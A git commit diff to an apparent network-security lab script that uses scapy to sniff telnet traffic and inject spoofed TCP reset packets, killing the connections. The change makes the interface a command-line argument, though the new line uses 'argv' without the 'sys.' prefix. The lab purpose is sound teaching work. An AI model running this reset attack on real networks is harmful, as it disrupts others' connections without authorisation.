75b550ad2bccf4ed2728533eed92909582ea90eb
rjofccs <93563397+rjofccs@users.noreply.github.com>
2023-07-03 18:21:35 -0700

    Update resetauto.py

--- labs/Lab2/volumes/resetauto.py
+++ labs/Lab2/volumes/resetauto.py
@@ -1,6 +1,8 @@
 #!/usr/bin/env python3
 #!/usr/bin/python3
 from scapy.all import *
+import sys
+print(sys.argv)
 def spoof_tcp(pkt):
    IPLayer  = IP(dst=pkt[IP].src, src=pkt[IP].dst)
    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack,
@@ -8,4 +10,4 @@ def spoof_tcp(pkt):
    spoofpkt = IPLayer/TCPLayer
    ls(spoofpkt)
    send(spoofpkt, verbose=0)
-pkt=sniff(iface='br-3cba7ed65b16', filter='tcp and port 23', prn=spoof_tcp) #br-3cba7ed65b16
+pkt=sniff(iface=argv[1], filter='tcp and port 23', prn=spoof_tcp) #br-3cba7ed65b16
